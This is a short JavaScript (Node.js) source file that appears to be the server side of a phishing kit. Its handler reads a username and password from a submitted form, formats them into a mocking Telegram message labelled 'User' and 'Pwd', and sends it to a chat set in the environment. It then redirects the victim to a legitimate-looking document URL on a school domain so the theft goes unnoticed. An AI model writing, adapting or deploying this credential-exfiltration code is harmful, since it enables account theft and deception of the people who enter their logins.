import TelegramBot from 'node-telegram-bot-api'

// Creamos una instancia del bot en modo "polling" (escucha activa)
const bot = new TelegramBot(process.env.telegram_bot_id, { polling: false });

const sender = async (req, res) => {
  let msg
  //const uId = req.body.username
  //const pwd = req.body.password
  if(req.query.msg) {
  msg = req.query.msg
  } else {
  const { username, password } = req.body
  if ( !username || !password  ) return res.redirect('/')
  msg = `■■■■■🤣🫵🤡■■■■■
👤 User: ${username}
🔑 Pwd: ${password}
■■■■■■■■■■■■■■■`
}
  try {
    const sentMessage = await bot.sendMessage(process.env.chat_id, msg);
    //console.log('Mensaje enviado:', sentMessage.text);
    res.redirect('https://dolischool.unez.edu.mx/dolischool_est/custom/dolischoolest/public/viewdoc.php?token=ca280f2434cb5fe4e44cb840aa8de96a&r')
  } catch (err) {
    console.error('Error al enviar mensaje:', err.message);
  }
};

export {
  sender,
}